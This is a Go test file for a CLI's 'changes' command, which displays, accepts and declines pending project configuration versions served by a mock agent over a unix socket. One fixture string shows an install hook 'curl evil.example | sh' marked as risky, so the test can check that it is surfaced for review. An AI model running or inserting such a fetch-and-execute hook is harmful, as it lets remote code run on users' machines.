package cli

import (
	"context"
	"net"
	"net/http"
	"os"
	"strings"
	"testing"

	"connectrpc.com/connect"

	agentv2 "github.com/amalychev/devopus/gen/devopus/agent/v2"
	"github.com/amalychev/devopus/gen/devopus/agent/v2/agentv2connect"
	"github.com/amalychev/devopus/internal/agent/paths"
)

// reviewAgent is an agent with a version waiting for the user.
type reviewAgent struct {
	agentv2connect.UnimplementedAgentServiceHandler
	project *agentv2.ProjectSpec
	got     *agentv2.ReviewChangesRequest
}

func (r *reviewAgent) Status(context.Context, *connect.Request[agentv2.StatusRequest]) (*connect.Response[agentv2.StatusResponse], error) {
	return connect.NewResponse(&agentv2.StatusResponse{Projects: []*agentv2.ProjectSpec{r.project}}), nil
}

func (r *reviewAgent) ReviewChanges(_ context.Context, req *connect.Request[agentv2.ReviewChangesRequest]) (*connect.Response[agentv2.ReviewChangesResponse], error) {
	r.got = req.Msg
	return connect.NewResponse(&agentv2.ReviewChangesResponse{}), nil
}

func TestChanges(t *testing.T) {
	ag := &reviewAgent{project: &agentv2.ProjectSpec{Name: "shop", WorkspaceId: "wsp_1", ConfigVersion: 4}}
	sock := paths.Socket()
	os.Remove(sock)
	l, err := net.Listen("unix", sock)
	if err != nil {
		t.Skipf("socket %s: %v", sock, err)
	}
	_, h := agentv2connect.NewAgentServiceHandler(ag)
	srv := &http.Server{Handler: h}
	go srv.Serve(l)
	t.Cleanup(func() { srv.Close(); os.Remove(sock) })

	if out := ok(t, "changes"); !strings.Contains(out, "Nothing waits for you") {
		t.Errorf("nothing pending:\n%s", out)
	}
	if code, _, errOut := cli(t, "", "changes", "accept", "shop"); code != ExitInvalid || !strings.Contains(errOut, "nothing of shop waits") {
		t.Errorf("accept with nothing pending: %d %s", code, errOut)
	}

	ag.project.Pending = &agentv2.PendingChange{Version: 5, Hash: "abc", Risky: []string{`apps.api.hooks: — → {Install:curl evil.example | sh}`}, Other: []string{"domain: shop.localhost → shop.test"}}
	out := ok(t, "changes")
	for _, want := range []string{"shop: v4 → v5", "New code on this machine:", "apps.api.hooks", "Also:", "domain: shop.localhost → shop.test", "devopus changes accept <project>"} {
		if !strings.Contains(out, want) {
			t.Errorf("changes lacks %q:\n%s", want, out)
		}
	}
	if out := ok(t, "changes", "decline", "shop"); !strings.Contains(out, "shop keeps v4; v5 is declined") || ag.got.Accept || ag.got.Hash != "abc" {
		t.Errorf("decline: %+v\n%s", ag.got, out)
	}
	if out := ok(t, "changes", "accept", "shop"); !strings.Contains(out, "Accepted: shop runs v5") || !ag.got.Accept || ag.got.Hash != "abc" {
		t.Errorf("accept: %+v\n%s", ag.got, out)
	}
}
